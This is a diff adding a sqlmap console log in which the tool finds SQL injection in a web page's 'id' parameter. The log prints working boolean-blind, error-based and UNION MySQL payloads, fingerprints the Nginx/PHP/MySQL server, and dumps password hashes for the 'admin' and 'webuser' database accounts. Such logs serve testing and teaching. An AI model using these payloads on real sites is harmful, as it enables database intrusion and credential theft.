@@ -1,0 +1,43 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7.2#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[*] starting @ 12:00:00 /2026-11-19/
+
+[12:00:01] [INFO] testing connection to the target URL
+[12:00:02] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:00:03] [INFO] testing if the target URL content is stable
+[12:00:04] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[12:00:05] [INFO] testing for SQL injection on GET parameter 'id'
+[12:00:06] [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5849=5849
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 1148 FROM(SELECT COUNT(*),CONCAT(0x7178767171,(SELECT (ELT(1148=1148,1))),0x7170707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7178767171,0x5447664877477148494f6f484852646247656667,0x7170707a71),NULL-- -
+---
+[12:00:07] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0, PHP 7.4.3
+back-end DBMS: MySQL >= 5.0.12
+[12:00:08] [INFO] fetching database users password hashes
+database management system users password hashes:
+[*] admin [1]:
+    password hash: *4ACFE3202A5FF5CF467898FC58AAB1D615029441
+[*] webuser [1]:
+    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+[12:00:09] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/target'
+
+[*] ending @ 12:00:10 /2026-11-19/
